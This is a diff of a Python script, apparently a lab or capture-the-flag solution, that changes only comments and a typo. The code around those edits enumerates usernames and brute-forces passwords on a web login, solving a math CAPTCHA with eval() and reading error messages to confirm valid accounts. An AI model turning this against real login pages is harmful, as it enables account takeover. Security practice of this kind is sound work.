@@ -25,15 +25,15 @@ def print_title(title):
     print('-*-'*30)
     print('\n')
 
-def regex_search(data, pattern):
+def regex_search(data, pattern):  # Matches text from data based on regex pattern.
     return re.findall(pattern, data)
 
-def get_captcha(data): # Matches text from data based on regex pattern.
+def get_captcha(data): # Grabs Math expression from Captcha
     pattern = '\d+\s.\s\d+'
     return regex_search(data, pattern)
 
-def check_if_failed(content, pattern):
-    fail = regex_search(content, pattern) # Check if you got User doesn't exist
+def check_if_failed(content, pattern): # Check if you got the failed case, example 'user doesn't exist'
+    fail = regex_search(content, pattern) 
     if(fail):
         return True
     else:
@@ -61,7 +61,7 @@ def user_enum(): # Username Enumeration
         res1 = post_request(url, data={'username':user,'password':'test','captcha':eval(captcha[0])})
         print(f'Testing {user}')
         
-        ##Check if requets failed
+        ##Check if requests failed
         fail = check_if_failed(str(res1.content), 'The user &#39;.+&#39; does not exist') # If matched, user doesn't exist.
         if(not fail):
             print_title(f'User found: {user}')
@@ -80,7 +80,7 @@ def password_enum(user): # Password Enumeration
         res1 = post_request(url, data={'username':user,'password':password,'captcha':eval(captcha[0])})
         print(f'Testing {password}')
         
-        ##Check if requets failed
+        ##Check if requests failed
         fail = check_if_failed(str(res1.content), 'Invalid password for user &#39;.+&#39;') # If matched, password doesn't exist.
         if(not fail):
             print_title(f'Valid login found: {user}:{password}')
